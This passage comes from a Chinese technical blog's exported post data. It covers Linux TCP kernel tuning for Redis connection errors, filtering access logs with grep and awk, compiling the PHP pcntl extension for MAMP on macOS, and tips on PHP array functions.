class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sysctl -w net.ipv4.tcp_timestamps=1 开启对于 TCP 时间戳的支持, 若该项设置为 0，则下面一项设置不起作用</span><br><span class=\"line\"></span><br><span class=\"line\">sysctl -w net.ipv4.tcp_tw_recycle=1 表示开启 TCP 连接中 TIME-WAIT sockets 的快速回收</span><br><span class=\"line\"></span><br><span class=\"line\">Redis 错误 ：Cannot assign request</span><br><span class=\"line\"></span><br><span class=\"line\">Could not connect to Redis at 127.0.0.1:6379: connect: Cannot assign request</span><br></pre></td></tr></table></figure>\n<p>经查官方 Wiki 是系统网络配置问题已经解决：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> 1 &gt; /proc/sys/net/ipv4/tcp_tw_reuse</span><br></pre></td></tr></table></figure>\n<p>以上需要 root 权限对网络进行配置。</p>\n<h4 id=\"方法二\"><a href=\"#方法二\" class=\"headerlink\" title=\"方法二\"></a>方法二</h4><p>通过调整内核参数解决，<code>vim /etc/sysctl.conf</code>，加入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net.ipv4.tcp_syncookies = 1 #表示开启 SYN Cookies。当出现 SYN 等待队列溢出时，启用 cookies 来处理，可防范少量 SYN 攻击，默认为 0，表示关闭；</span><br><span class=\"line\"></span><br><span class=\"line\">net.ipv4.tcp_tw_reuse = 1 #表示开启重用。允许将 TIME-WAIT sockets 重新用于新的 TCP 连接，默认为 0，表示关闭，释放 TIME_WAIT 端口给新连接使用；</span><br><span class=\"line\"></span><br><span class=\"line\">net.ipv4.tcp_tw_recycle = 1 #表示开启 TCP 连接中 TIME-WAIT sockets 的快速回收资源，默认为 0，表示关闭。</span><br><span class=\"line\"></span><br><span class=\"line\">net.ipv4.tcp_fin_timeout = 30 #修改系統默认的 TIMEOUT 时间，调低端口释放后的等待时间，默认为 60s，修改为 15~30s</span><br><span class=\"line\"></span><br><span class=\"line\">net.ipv4.tcp_max_tw_buckets = 10000# 通过设置它，系统会将多余的 TIME_WAIT 删除掉，此时系统日志里可能会显示：『TCP: time wait bucket table overflow』，多数情况下不用在意这些信息。</span><br></pre></td></tr></table></figure>\n<p>然后执行 <code>/sbin/sysctl -p</code> 让参数生效。</p>\n<p>以上都可以通过命令（sysctl -w）方式操作，如：<code>sysctl -w net.ipv4.tcp_fin_timeout=30</code> ，只适合临时修改参数。</p>\n<h3 id=\"TCP-网络参数优化\"><a href=\"#TCP-网络参数优化\" class=\"headerlink\" title=\"TCP 网络参数优化\"></a>TCP 网络参数优化</h3><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"1024 65535\"</span> &gt; /proc/sys/net/ipv4/ip_local_port_range 设置向外连接可用端口范围 表示可以使用的端口为 65535-1024 个（0~1024 为受保护的)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> 1 &gt; /proc/sys/net/ipv4/tcp_tw_reuse 设置 time_wait 连接重用 默认 0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> 1 &gt; /proc/sys/net/ipv4/tcp_tw_recycle 设置快速回收 time_wait 连接 默认 0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> 180000 &gt; /proc/sys/net/ipv4/tcp_max_tw_buckets 设置最大 time_wait 连接长度 默认 262144</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> 1 &gt; /proc/sys/net/ipv4/tcp_timestamps  设置是否启用比超时重发更精确的方法来启用对 RTT 的计算 默认 0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> 1 &gt; /proc/sys/net/ipv4/tcp_window_scaling 设置 TCP/IP 会话的滑动窗口大小是否可变 默认 1</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> 20000 &gt; /proc/sys/net/ipv4/tcp_max_syn_backlog 设置最大处于等待客户端没有应答的连接数 默认 2048</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> 15 &gt; /proc/sys/net/ipv4/tcp_fin_timeout  设置 FIN-WAIT 状态等待回收时间 默认 60</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"4096 87380 16777216\"</span> &gt; /proc/sys/net/ipv4/tcp_rmem  设置最大 TCP 数据发送缓冲大小，分别为最小、默认和最大值  默认 4096    87380   4194304</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"4096 65536 16777216\"</span> &gt; /proc/sys/net/ipv4/tcp_wmem 设置最大 TCP 数据 接受缓冲大小，分别为最小、默认和最大值 　默认 4096    87380   4194304</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> 10000 &gt; /proc/sys/net/core/somaxconn  设置每一个处于监听状态的端口的监听队列的长度 默认 128</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> 10000 &gt; /proc/sys/net/core/netdev_max_backlog 设置最大等待 cpu 处理的包的数目 默认 1000</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> 16777216 &gt; /proc/sys/net/core/rmem_max 设置最大的系统套接字数据接受缓冲大小 默认 124928</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> 262144 &gt; /proc/sys/net/core/rmem_default  设置默认的系统套接字数据接受缓冲大小 默认 124928</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> 16777216 &gt; /proc/sys/net/core/wmem_max  设置最大的系统套接字数据发送缓冲大小 默认 124928</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> 262144 &gt; /proc/sys/net/core/wmem_default  设置默认的系统套接字数据发送缓冲大小 默认 124928</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> 2000000 &gt; /proc/sys/fs/file-max 设置最大打开文件数 默认 385583</span><br></pre></td></tr></table></figure>\n<p>结合 ab 命令来压测机器优化网络，设置完记得保存</p>\n<h3 id=\"优化-Redis-命令\"><a href=\"#优化-Redis-命令\" class=\"headerlink\" title=\"优化 Redis 命令\"></a>优化 Redis 命令</h3><p>设置内存分配方式：</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo <span class=\"number\">1</span> &gt; <span class=\"regexp\">/proc/</span>sys<span class=\"regexp\">/vm/</span>overcommit_memory</span><br></pre></td></tr></table></figure>\n<p>0 表示内核将检查是否有足够的可用内存供应用进程使用；如果有足够的可用内存，内存申请允许；否则，内存申请失败，并把错误返回给应用进程。</p>\n<p>1 表示内核允许分配所有的物理内存，而不管当前的内存状态如何。</p>\n<p>2 表示内核允许分配超过所有物理内存和交换空间总和的内存</p>\n<p>关闭 THP：</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cho never &gt; <span class=\"regexp\">/sys/</span>kernel<span class=\"regexp\">/mm/</span>transparent_hugepage<span class=\"regexp\">/enabled</span></span><br></pre></td></tr></table></figure>\n<p>尽管 THP 的本意是为提升性能，但某些数据库厂商还是建议直接关闭 THP(比如说 Oracle、MongoDB 等)，否则可能导致性能下降，内存锁，甚至系统重启等问题。</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo <span class=\"number\">1024</span> &gt;<span class=\"regexp\">/proc/</span>sys<span class=\"regexp\">/net/</span>core<span class=\"regexp\">/somaxconn</span></span><br></pre></td></tr></table></figure>\n<p>限制了接收新 TCP 连接侦听队列的大小。对于一个经常处理新连接的高负载 web 服务环境来说，默认的 128 太小了。大多数环境这个值建议增加到 1024 或者更多。 服务进程会自己限制侦听队列的大小 (例如 sendmail(8) 或者 Apache)，常常在它们的配置文件中有设置队列大小的选项。大的侦听队列对防止拒绝服务 DoS 攻击也会有所帮助。</p>"},{"layout":"post","title":"网站访问日志的日常操作","abbrlink":63154,"_content":"\n### 前言\n\n日常工作中，网站如果遇到异常情况，经常需要查看访问日志来查找问题，由于日志文件庞大查找起来很不放便，所以需要进行一些过滤处理\n\n<!--more-->\n\n### 筛选出可疑IP的访问日志\n\n```\ncat example.log | grep '127.0.0.1' > 127.0.0.1.log\n```\n\n### 筛选出日志的某一列数据\n\n```\nawk -F \",\" '{print $2\" \"$3\"}' example.log\n```\n\n### 根据某列数据进行去重\n\n```\nawk -F \",\"  '!a[$2,$3]++'  example.log\n```\n\n### 去除重复行\n\n```\nsort example.log | uniq\n```","source":"_posts/2019/12/网站访问日志的日常操作.md","raw":"---\nlayout: post\ntitle: 网站访问日志的日常操作\ntags:\n  - linux\ncategories:\n  - linux\nabbrlink: 63154\n---\n\n### 前言\n\n日常工作中，网站如果遇到异常情况，经常需要查看访问日志来查找问题，由于日志文件庞大查找起来很不放便，所以需要进行一些过滤处理\n\n<!--more-->\n\n### 筛选出可疑IP的访问日志\n\n```\ncat example.log | grep '127.0.0.1' > 127.0.0.1.log\n```\n\n### 筛选出日志的某一列数据\n\n```\nawk -F \",\" '{print $2\" \"$3\"}' example.log\n```\n\n### 根据某列数据进行去重\n\n```\nawk -F \",\"  '!a[$2,$3]++'  example.log\n```\n\n### 去除重复行\n\n```\nsort example.log | uniq\n```","slug":"2019/12/网站访问日志的日常操作","published":1,"date":"2019-12-09T06:54:13.825Z","updated":"2020-04-12T06:34:43.619Z","comments":1,"photos":[],"link":"","_id":"ck9z76vzg000e44vqgvkg37g4","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>日常工作中，网站如果遇到异常情况，经常需要查看访问日志来查找问题，由于日志文件庞大查找起来很不放便，所以需要进行一些过滤处理</p>\n<a id=\"more\"></a>\n<h3 id=\"筛选出可疑IP的访问日志\"><a href=\"#筛选出可疑IP的访问日志\" class=\"headerlink\" title=\"筛选出可疑IP的访问日志\"></a>筛选出可疑IP的访问日志</h3><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat example.log | grep '<span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span>' &gt; <span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span>.log</span><br></pre></td></tr></table></figure>\n<h3 id=\"筛选出日志的某一列数据\"><a href=\"#筛选出日志的某一列数据\" class=\"headerlink\" title=\"筛选出日志的某一列数据\"></a>筛选出日志的某一列数据</h3><figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">awk -F <span class=\"string\">\",\"</span> '&#123;<span class=\"keyword\">print</span> <span class=\"variable\">$2</span><span class=\"string\">\" \"</span><span class=\"variable\">$3</span>\"&#125;' example.<span class=\"built_in\">log</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"根据某列数据进行去重\"><a href=\"#根据某列数据进行去重\" class=\"headerlink\" title=\"根据某列数据进行去重\"></a>根据某列数据进行去重</h3><figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">awk</span> -F <span class=\"string\">\",\"</span>  <span class=\"string\">'!a[<span class=\"variable\">$2</span>,<span class=\"variable\">$3</span>]++'</span>  example.log</span><br></pre></td></tr></table></figure>\n<h3 id=\"去除重复行\"><a href=\"#去除重复行\" class=\"headerlink\" title=\"去除重复行\"></a>去除重复行</h3><figure class=\"highlight maxima\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">sort</span> <span class=\"built_in\">example</span>.<span class=\"built_in\">log</span> | uniq</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>日常工作中，网站如果遇到异常情况，经常需要查看访问日志来查找问题，由于日志文件庞大查找起来很不放便，所以需要进行一些过滤处理</p>","more":"<h3 id=\"筛选出可疑IP的访问日志\"><a href=\"#筛选出可疑IP的访问日志\" class=\"headerlink\" title=\"筛选出可疑IP的访问日志\"></a>筛选出可疑IP的访问日志</h3><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat example.log | grep '<span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span>' &gt; <span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span>.log</span><br></pre></td></tr></table></figure>\n<h3 id=\"筛选出日志的某一列数据\"><a href=\"#筛选出日志的某一列数据\" class=\"headerlink\" title=\"筛选出日志的某一列数据\"></a>筛选出日志的某一列数据</h3><figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">awk -F <span class=\"string\">\",\"</span> '&#123;<span class=\"keyword\">print</span> <span class=\"variable\">$2</span><span class=\"string\">\" \"</span><span class=\"variable\">$3</span>\"&#125;' example.<span class=\"built_in\">log</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"根据某列数据进行去重\"><a href=\"#根据某列数据进行去重\" class=\"headerlink\" title=\"根据某列数据进行去重\"></a>根据某列数据进行去重</h3><figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">awk</span> -F <span class=\"string\">\",\"</span>  <span class=\"string\">'!a[<span class=\"variable\">$2</span>,<span class=\"variable\">$3</span>]++'</span>  example.log</span><br></pre></td></tr></table></figure>\n<h3 id=\"去除重复行\"><a href=\"#去除重复行\" class=\"headerlink\" title=\"去除重复行\"></a>去除重复行</h3><figure class=\"highlight maxima\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">sort</span> <span class=\"built_in\">example</span>.<span class=\"built_in\">log</span> | uniq</span><br></pre></td></tr></table></figure>"},{"title":"Mac 安装 PHP 扩展 pcntl","abbrlink":33840,"_content":"\n在 Mac 下做 PHP 开发用的是 MAMP 集成开发环境，出现 PHP 不支持 pcntl 扩展，查下谷歌发现 MAMP 的集成环境是没有这个扩展包的，需要手动编译安装这个包。\n\n\n### 具体步骤\n\n```shell\n\n# 下载源码包\nwget http://cn.php.net/distributions/php-7.2.1.tar.gz\n\n# 解压\ntar zxvf php-7.2.1.tar.gz\n\n# 进入文件执行编译\ncd php-7.2.1/ext/pcntl\nphpize\n./configure\nmake\n\n# 拷贝编译.so文件到MAMP extensions目录(具体的文件夹看自己的目录哦)\ncp modules/pcntl.so /Applications/MAMP/bin/php/php7.2.1/lib/php/extensions/no-debug-non-zts-20170718\n\n# 编辑php.ini引入扩展\necho \"extension=pcntl.so\" >> /Applications/MAMP/bin/php/php7.2.1/conf/php.ini\n```\n\n### 检查是否安装成功\n\n```shell\n\nphp --ri pcntl\n```\n","source":"_posts/2019/5/Mac安装PHP扩展之pcntl.md","raw":"---\ntitle: Mac 安装 PHP 扩展 pcntl\ntags:\n  - mac\n  - php\ncategories:\n  - php\nabbrlink: 33840\n---\n\n在 Mac 下做 PHP 开发用的是 MAMP 集成开发环境，出现 PHP 不支持 pcntl 扩展，查下谷歌发现 MAMP 的集成环境是没有这个扩展包的，需要手动编译安装这个包。\n\n\n### 具体步骤\n\n```shell\n\n# 下载源码包\nwget http://cn.php.net/distributions/php-7.2.1.tar.gz\n\n# 解压\ntar zxvf php-7.2.1.tar.gz\n\n# 进入文件执行编译\ncd php-7.2.1/ext/pcntl\nphpize\n./configure\nmake\n\n# 拷贝编译.so文件到MAMP extensions目录(具体的文件夹看自己的目录哦)\ncp modules/pcntl.so /Applications/MAMP/bin/php/php7.2.1/lib/php/extensions/no-debug-non-zts-20170718\n\n# 编辑php.ini引入扩展\necho \"extension=pcntl.so\" >> /Applications/MAMP/bin/php/php7.2.1/conf/php.ini\n```\n\n### 检查是否安装成功\n\n```shell\n\nphp --ri pcntl\n```\n","slug":"2019/5/Mac安装PHP扩展之pcntl","published":1,"date":"2019-04-10T09:51:07.039Z","updated":"2020-04-12T06:34:43.621Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck9z76vzh000f44vqtvp79fno","content":"<p>在 Mac 下做 PHP 开发用的是 MAMP 集成开发环境，出现 PHP 不支持 pcntl 扩展，查下谷歌发现 MAMP 的集成环境是没有这个扩展包的，需要手动编译安装这个包。</p>\n<h3 id=\"具体步骤\"><a href=\"#具体步骤\" class=\"headerlink\" title=\"具体步骤\"></a>具体步骤</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 下载源码包</span></span><br><span class=\"line\">wget http://cn.php.net/distributions/php-7.2.1.tar.gz</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 解压</span></span><br><span class=\"line\">tar zxvf php-7.2.1.tar.gz</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 进入文件执行编译</span></span><br><span class=\"line\">cd php-7.2.1/ext/pcntl</span><br><span class=\"line\">phpize</span><br><span class=\"line\">./configure</span><br><span class=\"line\">make</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 拷贝编译.so文件到MAMP extensions目录(具体的文件夹看自己的目录哦)</span></span><br><span class=\"line\">cp modules/pcntl.so /Applications/MAMP/bin/php/php7.2.1/lib/php/extensions/no-debug-non-zts-20170718</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 编辑php.ini引入扩展</span></span><br><span class=\"line\">echo \"extension=pcntl.so\" &gt;&gt; /Applications/MAMP/bin/php/php7.2.1/conf/php.ini</span><br></pre></td></tr></table></figure>\n<h3 id=\"检查是否安装成功\"><a href=\"#检查是否安装成功\" class=\"headerlink\" title=\"检查是否安装成功\"></a>检查是否安装成功</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">php --ri pcntl</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<p>在 Mac 下做 PHP 开发用的是 MAMP 集成开发环境，出现 PHP 不支持 pcntl 扩展，查下谷歌发现 MAMP 的集成环境是没有这个扩展包的，需要手动编译安装这个包。</p>\n<h3 id=\"具体步骤\"><a href=\"#具体步骤\" class=\"headerlink\" title=\"具体步骤\"></a>具体步骤</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 下载源码包</span></span><br><span class=\"line\">wget http://cn.php.net/distributions/php-7.2.1.tar.gz</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 解压</span></span><br><span class=\"line\">tar zxvf php-7.2.1.tar.gz</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 进入文件执行编译</span></span><br><span class=\"line\">cd php-7.2.1/ext/pcntl</span><br><span class=\"line\">phpize</span><br><span class=\"line\">./configure</span><br><span class=\"line\">make</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 拷贝编译.so文件到MAMP extensions目录(具体的文件夹看自己的目录哦)</span></span><br><span class=\"line\">cp modules/pcntl.so /Applications/MAMP/bin/php/php7.2.1/lib/php/extensions/no-debug-non-zts-20170718</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 编辑php.ini引入扩展</span></span><br><span class=\"line\">echo \"extension=pcntl.so\" &gt;&gt; /Applications/MAMP/bin/php/php7.2.1/conf/php.ini</span><br></pre></td></tr></table></figure>\n<h3 id=\"检查是否安装成功\"><a href=\"#检查是否安装成功\" class=\"headerlink\" title=\"检查是否安装成功\"></a>检查是否安装成功</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">php --ri pcntl</span><br></pre></td></tr></table></figure>\n"},{"title":"0 1 互转","abbrlink":47721,"_content":"\n平时翻转0、1操作，一般使用if语句或三目运算符完成，有些繁琐\n\n### 按位非\n\n```\n~value + 2;\n```\n\n### 异或\n\n```\n1 ^ 1 = 0;\n1 ^ 0 = 1;\n```\n\n","source":"_posts/2019/5/0 1互转.md","raw":"---\ntitle: 0 1 互转\ntags:\n  - php\ncategories:\n  - php\nabbrlink: 47721\n---\n\n平时翻转0、1操作，一般使用if语句或三目运算符完成，有些繁琐\n\n### 按位非\n\n```\n~value + 2;\n```\n\n### 异或\n\n```\n1 ^ 1 = 0;\n1 ^ 0 = 1;\n```\n\n","slug":"2019/5/0 1互转","published":1,"date":"2019-04-18T10:21:35.659Z","updated":"2020-04-12T06:34:43.620Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck9z76vzj000k44vqusqcs9l7","content":"<p>平时翻转0、1操作，一般使用if语句或三目运算符完成，有些繁琐</p>\n<h3 id=\"按位非\"><a href=\"#按位非\" class=\"headerlink\" title=\"按位非\"></a>按位非</h3><figure class=\"highlight 1c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"symbol\">~value + 2</span>;</span><br></pre></td></tr></table></figure>\n<h3 id=\"异或\"><a href=\"#异或\" class=\"headerlink\" title=\"异或\"></a>异或</h3><figure class=\"highlight basic\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"symbol\">1 </span>^ <span class=\"number\">1</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"symbol\">1 </span>^ <span class=\"number\">0</span> = <span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<p>平时翻转0、1操作，一般使用if语句或三目运算符完成，有些繁琐</p>\n<h3 id=\"按位非\"><a href=\"#按位非\" class=\"headerlink\" title=\"按位非\"></a>按位非</h3><figure class=\"highlight 1c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"symbol\">~value + 2</span>;</span><br></pre></td></tr></table></figure>\n<h3 id=\"异或\"><a href=\"#异或\" class=\"headerlink\" title=\"异或\"></a>异或</h3><figure class=\"highlight basic\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"symbol\">1 </span>^ <span class=\"number\">1</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"symbol\">1 </span>^ <span class=\"number\">0</span> = <span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n"},{"title":"巧用PHP数组函数","abbrlink":32349,"_content":"\nPHP 的数组是一种很强大的数据类型，与此同时 PHP 内置了一系列与数组相关的函数可以很轻易的实现日常开发的功能，善用 PHP 内置函数能极大的提高开发效率和运行效率（内置函数都是用 C 写的效率比用 PHP 写的高很多）\n\n### 取指定键名\n\n对于某些关联数组，有时候我们只想取指定键名的那部分，比如数组为 `['id' => 1, 'name' => 'zane', 'password' => '123456']` 此时若只想取包含 id 和 name\n\n\n```\n<?php\n$raw = ['id' => 1, 'name' => 'zane', 'password' => '123456'];\n// 自己用 PHP 实现\nfunction onlyKeys($raw, $keys) {\n    $new = [];\n    foreach ($raw as $key => $val) {\n        if (in_array($key, $keys)) {\n            $new[$key] = $val;\n        }\n    }\n\n    return $new;\n}\n// 用 PHP 内置函数实现\nfunction newOnlyKeys($array, $keys) {\n    return array_intersect_key($array, array_flip($keys));\n}\nvar_dump(onlyKeys($raw, ['id', 'name']));\n// 结果 ['id' => 1, 'name' => 'zane']\nvar_dump(newOnlyKeys($raw, ['id', 'name']));\n// 结果 ['id' => 1, 'name' => 'zane']\n```\n\n简单的介绍一下这两个函数的作用，首先是 `array_flip` 函数，这个函数的功能是「将数组的键和值对调」，也就是键名变成值，值变成键名。我们传递的 $keys 参数经过这个函数便从 `[0 => 'id', 1 => 'name']` 转变为了 `['id' => 0, 'name' => 1]`。这样做的目的是为了向 `array_intersect_key` 函数服务，`array_intersect_key` 函数的功能是「使用键名比较计算数组的交集」，也就是返回第一个参数数组中与其他参数数组相同键名的值\n\n\n### 移除指定键名\n\n```\n<?php\n$raw = ['id' => 1, 'name' => 'zane', 'password' => '123456'];\n// 用 PHP 内置函数实现\nfunction removeKeys($array, $keys) {\n    return array_diff_key($array, array_flip($keys));\n}\n// 移除 id 键\nvar_dump(removeKeys($raw, ['id', 'password']));\n// 结果 ['name' => 'zane']\n```\n\n和上一个例子相比本例只是将 `array_intersect_key` 函数改为 `array_diff_key`(刚好和 `array_intersect_key` 的功能相反)\n\n### 数组去重\n\nPHP 内置了 array_unique 函数\n\n```\n<?php\n$input = ['you are' => 666, 'i am' => 233, 'he is' => 233, 'she is' => 666];\n$result = array_unique($input);\nvar_dump($result);\n// 结果 ['you are' => 666, 'i am' => 233]\n```\n\n用这个函数就能解决大部分问题了，但是有时候可能会觉得它不够快，原因如下：\n\n- array_unique() 先将值作为字符串排序，然后对每个值只保留第一个遇到的键名，接着忽略所有后面的键名\n\n- 因为这个函数会先将数组进行排序，所以速度可能在某些场景达不到预期的要求\n\n续调用两次 `array_flip` 函数是不是就相当于实现了 `array_unique` 函数的功能？\n\n```\n<?php\n$input = ['you are' => 666, 'i am' => 233, 'he is' => 233, 'she is' => 666];\n$result = array_flip(array_flip($input));\nvar_dump($result);\n// 结果 ['she is' => 666, 'he is' => 233]\n```\n\n结果和 array_unique 的不一样，我们可以从 PHP 官方手册得到答案\n\n> 如果同一个值出现多次，则最后一个键名将作为它的值，其它键会被丢弃\n\n`array_unique` 保留第一个出现的键名，`array_flip `保留最后一个出现的键名\n\n**注意：** 使用 array_flip 作为数组去重时数组的值必须能够作为键名（即为 string 类型或 integer 类型），否则这个值将被忽略\n\n此外，若不需要保留键名可以直接这样使用 `array_values(array_flip($input))`\n\n\n###  重置索引\n\n当想要对一个索引并不连续的数组进行重置时，比如数组：`[0 => 233, 99 => 666]`，对于这种数组我们只需要调用 `array_values` 函数即可实现\n\n```\n<?php\n$input = [0 => 233, 99 => 